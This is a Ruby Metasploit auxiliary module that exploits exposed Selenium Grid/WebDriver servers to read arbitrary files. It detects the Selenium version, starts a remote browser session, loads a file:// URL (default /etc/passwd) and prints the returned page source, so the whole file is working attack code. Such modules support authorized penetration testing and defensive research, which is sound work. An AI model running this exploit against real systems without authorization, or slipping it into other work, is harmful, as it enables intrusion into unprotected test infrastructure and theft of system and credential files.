##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Selenium arbitrary file read',
        'Description' => %q{
          If there is an open selenium web driver, a remote attacker can send requests to the victims browser.
          In certain cases this can be used to access to the remote file system.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Jon Stratton',     # Original Metasploit module
          'Takahiro Yokoyama' # Metasploit module
        ],
        'References' => [
          [ 'URL', 'https://github.com/JonStratton/selenium-node-takeover-kit' ]
        ],
        'Platform' => 'misc',
        'Targets' => [
          [
            'Native Payload', {
              'Platform' => %w[linux osx win unix],
              'Arch' => ARCH_ALL
            }
          ]
        ],
        'DisclosureDate' => '2020-10-01', # Not sure this is correct
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [ IOC_IN_LOGS, ],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(4444),
        OptString.new('SCHEME', [true, 'The scheme to use', 'file']),
        OptString.new('FILEPATH', [true, 'File to read', '/etc/passwd']),
        OptEnum.new('BROWSER', [true, 'The browser to use', 'firefox', ['firefox', 'chrome', 'MicrosoftEdge']]),
        OptInt.new('TIMEOUT', [ true, 'Timeout for exploit (seconds)', 75 ]),
      ]
    )
  end

  def check
    # Request for Selenium Grid version 4
    v4res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'status')
    })
    if v4res && v4res.get_json_document && v4res.get_json_document.include?('value') &&
       v4res.get_json_document['value'].include?('message')
      if v4res.get_json_document['value']['message'] == 'Selenium Grid ready.'
        return Exploit::CheckCode::Detected('Selenium Grid version 4.x detected and ready.')
      elsif v4res.get_json_document['value']['message'].downcase.include?('selenium grid')
        return Exploit::CheckCode::Unknown('Selenium Grid version 4.x detected but not ready.')
      end
    end

    # Request for Selenium Grid version 3
    v3res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })
    return Exploit::CheckCode::Unknown('Unexpected server reply.') unless v3res&.code == 200

    js_code = v3res.get_html_document.css('script').find { |script| script.text.match(/var json = Object.freeze\('(.*?)'\);/) }
    return Exploit::CheckCode::Unknown('Unable to determine the version.') unless js_code

    json_str = js_code.text.match(/var json = Object.freeze\('(.*?)'\);/)[1]
    begin
      json_data = JSON.parse(json_str)
    rescue JSON::ParserError
      return Exploit::CheckCode::Unknown('Unable to determine the version.')
    end
    return Exploit::CheckCode::Unknown('Unable to determine the version.') unless json_data && json_data.include?('version') && json_data['version']

    # Extract the version
    version = Rex::Version.new(json_data['version'])
    @version3 = version < Rex::Version.new('4.0.0')

    Exploit::CheckCode::Appears("Version #{version} detected")
  end

  def run
    case datastore['BROWSER']
    when 'firefox'
      options = 'moz:firefoxOptions'
    when 'chrome'
      options = 'goog:chromeOptions'
    when 'MicrosoftEdge'
      options = 'ms:edgeOptions'
    end
    # Start session. driver = Selenium::WebDriver.for :remote, :url => url, :desired_capabilities => { :browserName => browser }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wd/hub/session'),
      'ctype' => 'application/json; charset=utf-8',
      'data' => JSON.generate({
        desiredCapabilities: { browserName: datastore['BROWSER'] },
        capabilities: {
          firstMatch: [
            {
              browserName: datastore['BROWSER'],
              "#{options}": {}
            }
          ]
        }
      })
    }, datastore['TIMEOUT'])
    fail_with(Failure::Unknown, 'Unexpected server reply.') unless res

    session_id = res.get_json_document['value']['sessionId'] || res.get_json_document['sessionId']
    fail_with(Failure::Unknown, 'Failed to start session.') unless session_id

    print_status("Started session (#{session_id}).")

    # driver.get('file://%s' % [FILEPATH])
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, "wd/hub/session/#{session_id}/url"),
      'ctype' => 'application/json; charset=utf-8',
      'data' => JSON.generate({ url: "#{datastore['SCHEME']}://#{datastore['FILEPATH']}" })
    })
    fail_with(Failure::Unknown, "Failed to execute driver.get('#{datastore['SCHEME']}://#{datastore['FILEPATH']}').") unless res

    # driver.page_source
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "wd/hub/session/#{session_id}/source"),
      'ctype' => 'application/json; charset=utf-8'
    })
    fail_with(Failure::Unknown, "Failed to read file: #{datastore['FILEPATH']}.") unless res

    print_good("#{datastore['FILEPATH']}\n#{Nokogiri::HTML(res.get_json_document['value'])&.at('pre')&.text}")

    # End session
    # This may take some time (about 5 minutes or so), so no timeout is set here.
    res = send_request_cgi({
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, @version3 ? "wd/hub/session/#{session_id}" : "session/#{session_id}"),
      'headers' => { 'Content-Type' => 'application/json; charset=utf-8' }
    })
    if res
      print_status("Deleted session (#{session_id}).")
    else
      print_status("Failed to delete the session (#{session_id}). "\
                   'You may need to wait for the session to expire (default: 5 minutes) or '\
                   'manually delete the session for the next exploit to succeed.')
    end
  end

end
